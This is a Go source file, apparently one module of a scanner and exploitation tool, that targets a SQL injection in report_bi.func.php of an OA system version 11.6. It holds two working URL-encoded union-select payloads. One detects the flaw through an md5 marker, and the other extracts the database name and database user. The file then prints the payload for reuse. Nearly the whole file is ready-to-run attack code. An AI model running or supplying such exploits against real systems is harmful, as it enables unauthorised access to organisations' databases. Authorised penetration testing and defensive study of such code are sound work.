package vulners

import (
	"strings"

	"github.com/fatih/color"
)

type Td07 struct {
}

func (c *Td07) Scan(targetUrl string) {
	vulnerable, err := Td07scancore(targetUrl)
	if err != nil {
		color.Red("[X]请求异常！")
		return
	}
	if vulnerable {
		color.Green("[Td07] 可能存在v11.6 report_bi.func.php SQL注入，请执行Exp模块进行验证")
	} else {
		color.White("[Td07] 不存在v11.6 report_bi.func.php SQL注入")
	}
}

func (*Td07) Exploit(targetUrl string) {
	runResult, err := Td07runcore(targetUrl)
	if err != nil {
		color.Red("[X]漏洞利用异常！")
		return
	}
	if runResult != "" {
		color.Green(runResult)
	} else {
		color.White("[!]漏洞利用无返回结果")
	}
}

func Td07scancore(targetUrl string) (bool, error) {
	url := "/general/bi_design/appcenter/report_bi.func.php"
	data := `_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+md5%281%29%2C2%2C3%23%27&action=get_link_info&`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return false, err
	}
	resContent := resp.String()
	if resp.StatusCode == 200 && strings.Contains(resContent, "c4ca4238a0b923820dcc509a6f75849b") {
		return true, nil
	} else {
		return false, nil
	}
}

func Td07runcore(targetUrl string) (string, error) {
	url := "/general/bi_design/appcenter/report_bi.func.php"
	data := `_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&`
	resp, err := baseClient.
		NewRequest().
		SetHeaders(map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}).SetBodyString(data).Post(targetUrl + url)
	if err != nil {
		return "", err
	}
	resContent := resp.String()
	if strings.Contains(resContent, "td_oa") {
		return `[Td07] 存在v11.6 report_bi.func.php SQL注入
类型为联合注入
Payload:
_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info&`, nil
	} else {
		return "", nil
	}
}
